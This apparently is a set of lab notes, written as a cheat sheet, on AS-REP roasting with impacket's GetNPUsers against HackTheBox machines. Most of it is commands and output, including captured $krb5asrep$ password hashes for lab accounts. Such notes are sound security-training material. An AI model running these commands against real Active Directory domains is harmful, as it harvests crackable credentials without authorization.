# AS-REP Roasting with GetNPUsers

- [AS-REP Roasting with GetNPUsers](#as-rep-roasting-with-getnpusers)
- [Cracking Active Directory Passwords with AS-REP Roasting](#cracking-active-directory-passwords-with-as-rep-roasting)
- [TL;DR](#tldr)
- [Works](#works)
    - [E.g. HTB Forest](#eg-htb-forest)
- [Doesn't Works](#doesnt-works)
    - [Error in searchRequest](#error-in-searchrequest)
        - [E.g. HTB Active - Require Auth (successful bind)](#eg-htb-active---require-auth-successful-bind)
- [Common Mistakes](#common-mistakes)
    - [Domain Name without "/" suffix](#domain-name-without--suffix)

# [Cracking Active Directory Passwords with AS-REP Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)

> ... steal the password hashes of user accounts that have Kerberos preauthentication disabled, which they can then attempt to crack offline.
> Using anonymous bind you can enumerate LDAP and get a list of valid usernames.
> Then, you may use the GetNPUsers script from the impacket to check which of these usernames has Kerberos pre-authentication disabled.
> This is called AS-REP-Roasting.

Box | Domain | IP 
-|-|-
Forest | htb.local | 10.10.10.161
BLACKFIELD | BLACKFIELD.local | 10.10.10.

# TL;DR
```sh
GetNPUsers htb.local/ -request
GetNPUsers htb.local/ -r
GetNPUsers htb.local/ -dc-ip $ip
GetNPUsers htb.local/ -dc-ip $ip -request
GetNPUsers htb.local/ -dc-ip $ip -r
GetNPUsers BLACKFIELD.local/ -usersfile valid-users.txt -r
```

# Works
## E.g. HTB Forest
### HTB Forest vulnerable to ASREP, but not with HTB Active
```sh
$ impacket-GetNPUsers htb.local/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-08-02 13:09:07.367813  2023-08-02 11:47:00.513833  0x410200
```

# Doesn't Works
## Error in searchRequest
### E.g. HTB Active - Require Auth (successful bind)
HTB Active, Multimaster
NOT vulnerable to ASREP ???
```sh
$ impacket-GetNPUsers active.htb/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1
```

# Common Mistakes
## Domain Name without "/" suffix
```sh
$ impacket-GetNPUsers htb.local  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Domain should be specified!
```

### Examples; HTB Forest
```sh
$ impacket-GetNPUsers htb.local/ -request  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-08-02 13:10:42.227380  2023-08-02 11:47:00.513833  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:282f708038e3d413dcbb692377168a0c$a57ae2b2cd5cd99d5c063f53c3321feef6b6d805cf318cadeb5be31c297541b0cfaa35b0e447eed21def3b6c9f472d64cf381b51429abab7bea41cf769be50aaeed52dcce3e8c5f9c1b6686d62d2ca217ee369c810ad582a046fa5f093fa6f9891daf3e02b6b0c576b9b28fc37c8a615d499c7303497b21873cd9bdc1d01f69d628dd66bdf63cdae985a50f0d6dd30b9ecd59e6fd56610cf2a63bf58920ceff8c28a81c8ec0aedf3e68cee83986c094af2caa38423435923fcfecea279d816b5e601436a7b10e1b966771e7f8cb3cc5f3ada3c375f2c8f2fc1b1a4d658eb28d2307331eb653a
```

### GetNPUsers htb.local/ -dc-ip $ip
```sh
C:\Tools\impacket-master\examples>python GetNPUsers.py htb.local/ -dc-ip $ip
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-08-01 02:30:31.919086  2023-07-31 18:08:17.247291  0x410200
```

### GetNPUsers htb.local/ -dc-ip $ip -request
```sh
C:\Tools\impacket-master\examples>python GetNPUsers.py htb.local/ -dc-ip $ip -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-08-01 02:30:31.919086  2023-07-31 18:08:17.247291  0x410200


$krb5asrep$23$svc-alfresco@HTB.LOCAL:725910cae0bc4d7afa0f322cf48c22ec$ea47da97143367e99e1f1ace94bef5f4b7d21f23e9496c27e51ae0cb498996b9581cc8fbcbe7ab10db77fbf3da7d27364f9ce868c64eed607c33df0b4d24a0e731fa9dce764e38c6dabaa9103c511771888f02e3c4e1e7bff80a245d78a4dd8e7c8dcf2e1c63e2c55932648bc09000f2e0227c5295d11845f6b0c5471e3246fa2d1ee3ba80f63eb0eef5b10067bfd1ec12f3a2dec5ada44bda4e5402bc3e25d8118e875def2b0798100065ca43f01f2823c758d0943bb54e5c8d20260b2cd4dedce4e8a4558eabee260f1008f33801e9e3bb8802c24065296c42c2c654e662450a05806dc400

C:\Tools\impacket-master\examples>
```

### Not all user
```sh
$ GetNPUsers BLACKFIELD.local/ -usersfile valid-users.txt -r
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:f764e18d4bf1c000c1caba2c30a836e6$1fd948cf3592f7da94563cde9ffb2d7363c280284c1226c91a7cfa6bfeb8226fe8f2dfe2443d071e732d5cd25de24dd02024d1575b4db0353d8cbe54dcd5ca241f1a643462adaf97184522f0b2fd05fa6d19ce521b49d0a314a56f274e623caf478a7f0228eb9e5fc74bcdb98f4eaf567d4d28cfeb09dbe3291e5c5503cfd5738e9febd987cdff89d27fd2d0074eb9dc21d3fc42882b73c0b4873d8064c524e8d8f9ec57747c30deaa4a17b892d8905146c95f7429f72640ba6c179477c110ca5ca3396f6b7ed3ec77cc9de8de09435fe97e444dce3d9fc7310b6743809bf7b7193a90c45749b07fc4b3f8bc8ae9d39b41ebe7e3

"audit2020" and "svc_backup" are valid users. However, "UF_DONT_REQUIRE_PREAUTH" flag is not set for users "audit2020" and "svc_backup" so we can't get krb5asrep hash from them.

"UF_DONT_REQUIRE_PREAUTH" flag tells the Kerberos server not to require pre-authentication for the user. Without this flag set, the server will always require pre-authentication, which includes sending a krb5asrep message.
```